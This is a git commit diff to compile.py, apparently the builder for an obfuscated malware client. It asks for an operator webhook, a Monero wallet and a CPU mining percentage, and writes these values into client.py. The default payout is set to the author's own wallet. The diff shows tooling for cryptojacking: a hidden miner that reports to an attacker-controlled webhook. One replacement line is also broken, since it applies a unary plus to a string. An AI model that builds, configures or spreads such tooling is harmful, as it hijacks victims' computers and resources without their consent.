aa7b9950599eef9f88cd19d5d47ef36930deb8cf
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-20 06:03:32 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -6,11 +6,12 @@ import pyImpossibleObf
 
 key ="loooood"
 webhook = input("Webhook : ")
-trxaddress = input("TRX Address (enter for default, and support me btw) :")
+trxaddress = input("XMR (Monero) Address (enter for default, and support me btw) :")
+miningpercent = input("CPU Usage (30 is the best) :")
 if trxaddress == "":
-	trxaddress = "TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d"
+	trxaddress = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq"
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook).replace("TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d", "TRX:" + trxaddress )
+filecontent = filecontent.replace("webhook667", webhook).replace("XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq", + trxaddress ).replace("MINING_PERCENT", str(miningpercent))
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
